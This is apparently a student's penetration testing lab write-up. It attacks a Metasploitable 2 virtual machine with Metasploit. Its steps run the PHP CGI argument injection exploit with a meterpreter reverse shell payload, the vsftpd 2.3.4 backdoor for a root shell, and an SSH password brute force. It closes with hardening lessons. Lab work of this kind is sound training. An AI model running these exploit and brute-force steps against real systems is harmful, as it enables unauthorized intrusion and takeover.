# Penetration Testing Labs

## Introduction
This project documents penetration testing techniques using **Metasploitable 2**, a deliberately vulnerable virtual machine, to practice **ethical hacking and exploit testing**. The goal is to demonstrate **scanning, enumeration, exploitation, and post-exploitation techniques** using Kali Linux tools and **Metasploit Framework**.

## Target System
- **Metasploitable 2 VM**
- **IP Address:** `192.168.0.114`

## Tools Used
- **Kali Linux** (Virtual Machine)
- **Metasploit Framework**
- **Nmap** (Network Scanner)
- **nbtscan** (NetBIOS Name Scanner)
- **Brute-force wordlists (usernames.txt, passwords.txt)**

---

## Port 80 - Web Exploitation

### Step 1: Scanning for Open Ports
```bash
nmap -sV 192.168.0.114 -p 80
```
**Result:** Apache HTTPD 2.2.8 (Ubuntu) with DAV/2 enabled.


### Step 2: Directory Enumeration
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.0.114
run
```
**Discovered Directories:** `/cgi-bin/`, `/doc/`, `/icons/`, `/phpMyAdmin/`, `/test/`


### Step 3: Exploiting PHP Vulnerability
```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.0.114
set PAYLOAD php/meterpreter/reverse_tcp
exploit
```
✅ **Result:** Meterpreter session opened, access as `www-data`.

![image](https://github.com/user-attachments/assets/107cb422-ba35-44ff-99e8-aca5c4939686)
![image](https://github.com/user-attachments/assets/afdfdd2d-3c5c-4fef-af4d-efff3f98853f)
![image](https://github.com/user-attachments/assets/8f7d3887-6ef7-456d-b44b-6ccecd2b77d8)
![image](https://github.com/user-attachments/assets/baa9a0ab-d300-4135-820d-083467c74834)
![image](https://github.com/user-attachments/assets/8de18848-5423-4055-beec-cbe2e83d4525)
![image](https://github.com/user-attachments/assets/ee4b2f81-e6a2-4b48-85b4-d25efb275ee3)
![image](https://github.com/user-attachments/assets/e184259f-f2d1-4d42-83dc-bbaea9617b3d)
![image](https://github.com/user-attachments/assets/12fa30e4-455c-4faf-8d0b-7e187a6fa241)


---

## Port 21 - FTP Exploitation

### Step 1: Scanning and Identifying Services
```bash
nmap -sV --script vuln 192.168.0.114 -p 21
```
**Result:** Found **vsftpd 2.3.4**, known for **backdoor vulnerability (CVE-2011-2523).**


### Step 2: Exploiting vsftpd Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.0.114
exploit
```
✅ **Result:** Root shell access obtained.

![image](https://github.com/user-attachments/assets/790e5602-ba17-4b7e-bf44-a138d5dd9ed0)
![image](https://github.com/user-attachments/assets/df4f8465-c093-43bd-828c-8a9e90a16a02)
![image](https://github.com/user-attachments/assets/56513f6f-be22-4a65-9d02-8f35fa55b441)
![image](https://github.com/user-attachments/assets/68364a6e-844c-4499-8c83-a1f2fe603a09)
![image](https://github.com/user-attachments/assets/c5bb61f1-234d-4284-a8fd-93c50728f256)

---

## Port 22 - SSH Exploitation

### Step 1: Scanning for SSH Service
```bash
nmap -sV --script vuln 192.168.0.114 -p 22
```
**Result:** OpenSSH 4.7p1 running on Debian.

### Step 2: Brute-force SSH Login
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.114
set USER_FILE usernames.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
exploit
```
✅ **Result:** Successfully cracked login credentials **msfadmin:msfadmin**


### Step 3: Interacting with SSH Session
```bash
sessions -i 2
whoami
ls
```
✅ **Result:** Logged in as **msfadmin**, access to system directories.

![image](https://github.com/user-attachments/assets/8c5c868f-e28d-4d49-9acd-4324fa26e992)
![image](https://github.com/user-attachments/assets/979298d1-f05f-4f3c-980d-6f3360184a6c)
![image](https://github.com/user-attachments/assets/8ef8febe-bd55-4c94-bea7-25566bb363f4)
![image](https://github.com/user-attachments/assets/35c29a44-ea34-4f73-8305-7708365be408)
![image](https://github.com/user-attachments/assets/3a62c976-7ea4-4b36-9599-ffb1420bcd54)

---

## Conclusion
This penetration testing lab demonstrates the **importance of securing outdated services** and **using strong authentication measures**. Each exploit highlights vulnerabilities that ethical hackers and security professionals must address to **harden system security**.

🔹 **Lessons Learned:**
- Regularly update software and services to prevent exploitation.
- Implement **firewall rules** to restrict unnecessary services.
- Enforce **strong authentication methods** to prevent brute-force attacks.
